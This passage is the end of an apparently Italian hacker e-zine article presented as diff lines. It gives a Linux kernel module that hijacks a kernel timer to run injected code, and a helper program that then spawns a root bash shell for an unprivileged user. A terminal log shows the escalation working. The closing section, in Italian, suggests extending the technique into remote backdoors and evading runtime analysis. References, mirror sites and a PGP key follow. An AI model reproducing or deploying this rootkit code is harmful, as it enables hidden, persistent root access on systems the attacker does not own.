+	printk(KERN_ALERT "* Patching dummy address...\n");
+	
+	*((unsigned int *)((unsigned char *)inject + 2)) = (unsigned long)addr;
+	
+	printk(KERN_ALERT "* Inject_code is at: 0x%x\n", (unsigned int)inject);
+	
+	printk(KERN_ALERT "* Timer_list struct is at: 0x%x\n", 
+						(unsigned int)time_l);
+
+
+	init_timer(time_l);
+	time_l->data = (unsigned long)time_l;
+	time_l->expires = jiffies + TIME_EXEC;
+	time_l->function = (void(*)(unsigned long))inject;
+	add_timer(time_l);
+	return 0;
+}
+
+
+
+static void my_func_release(void)
+{
+	printk(KERN_ALERT "* Removing Module\n");
+	return;
+}
+
+module_init(my_func);
+module_exit(my_func_release);
+MODULE_LICENSE("GPL");
+<-X->
+
+<-| timerhijack/sgk.c |->
+#include <stdio.h>
+#include <stdlib.h>
+#define TIME_EXEC 10
+
+
+int main(char argc, char *argv[])
+{
+	char *buff[2] = { "/bin/bash", NULL };
+	printf("Sleeping....\n");
+	sleep(TIME_EXEC + 1);
+
+	printf("Executing shell....\n");
+	execve(buff[0], buff, NULL);
+	return -1;
+}
+
+/* EOF */
+<-X->
+
+sgrakkyu@test tmp$ su -
+Password:
+root@test # cd lkm/clock/
+root@test clock# gcc -c -Wall -I/usr/src/linux/include -D__KERNEL__ -o
+inject.o -D__ASSEMBLY__ inject.S
+root@test clock# objdump -d inject.o
+   0:	eb 04			jmp    6 <entry_code+0x6>
+   2:	90			nop
+   3:	90			nop
+
+....
+....
+ 10c:	59			pop    %ecx
+ 10d:	5b			pop    %ebx
+ 10e:	5d			pop    %ebp
+ 10f:	c3			ret	<--(size-1) (objdump start with 0-byte)
+
+root@test clock# echo '#define SELF_SIZE 0x110' > config_len.h
+
+root@test clock# gcc -c -Wall -I/usr/src/linux/include -D__KERNEL__ -o \
+inject.o -D__ASSEMBLY__ inject.S
+
+root@test clock# gcc -c -Wall -I/usr/src/linux/include -D__KERNEL__ -DMODULE \
+-o module.o module.c
+
+root@test clock# ld -r -m elf_i386 inject.o module.o -o clock.o
+root@test clock# insmod clock.o && rmmod clock	<-- module unloaded
+........
+........
+root@test clock# exit
+
+sgrakkyu@test tmp$ id
+uid=1000(sgrakkyu) gid=100(users) groups=100(users)
+sgrakkyu@test tmp$ gcc -o sgk sgk.c
+sgrakkyu@test tmp$ ls -al sgk
+-rwxr-xr-x    1 sgrakkyu users	     11721 Oct 12 04:48 sgk*
+sgrakkyu@test tmp$ ./sgk
+Sleeping ....
+Executing shell....
+bash-2.05b# id
+uid=0(root) gid=100(users) groups=100(users)
+bash-2.05b# exit
+exit
+sgrakkyu@test tmp$
+
+
+--] 7 - Consideration
+Nonostante questo esempio sia piuttosto riduttivo in un contesto reale e'
+possibile sfruttare questo meccanismo per fare praticamente qualsiasi cosa
+in qualsisi momento.
+L'importante e' mantenere un compromesso accettabile tra lunghezza della
+funzione e frequenza delle chiamate per non portare un overhead eccessivo che
+risulterebbe piuttosto sospetto.
+Non e' difficile implementare ad esempio una backdoor remota basata sulla
+analisi periodica dello stack di rete o anche usare questo schema in appoggio a
+tecniche piu' stabili come l'opcode-injection-dinamico, cambiando quello che
+serve solo al momento giusto e ristabilendo l'ordine appena si individua 
+"qualcosa che non va".
+Tutto questo e' possibile proprio perche' costruendo un'implementazione
+intelligente e' veramente possibile monitorare qualsiasi risorsa in tempo
+reale, anche evitare e controbattere a runtime analisi e controlli.
+Da qui in avanti c'e' solo l'immaginazione... sempre rimanendo nella
+razionalita' e rispettando le restrizioni del caso:))
+Good code:)
+
+
+--[ 8 - Thanks
+Thanks a HTB (my best friend), twiz(MIPS r0x), vecna, smaster, awgn, buffer e
+tutti gli amici di #phrack.it e Antifork.
+
+
+--[ 9 - References
+ [1] "Understanding the Linux Kernel"
+      Daniel P. Bovet and Marco Cesati
+      O'Reilly
+
+ [2] "Linux Device Drivers"
+      Alessandro Rubini and Jonathan Corbet
+      O'Reilly
+
+ [3] "Linux Kernel Development"
+     Robert Love
+     Developer's Library
+
+ [4] "Hijacking Linux Page Fault Handler"
+      buffer
+      Phrack 61-0x07
+      [ http://www.phrack.org ]
+
+ [5] "Kstat"
+      [ http://www.s0ftpj.org/en/tool.html ]
+
+ [6] "Intel Arch. Manual vol.2"
+      Intel Instructions Set
+
+ [7] "Dilemma"
+      kernel fingerprint tool by twiz
+      [ http://twiz.antifork.org/stuff/dilemma/ ]
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://bfi.s0ftpj.org      [main site - IT]
+        http://bfi.cx              [mirror - IT]
+        http://bfi.freaknet.org    [mirror - AT]
+        http://bfi.anomalistic.org [mirror - SG]
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
+
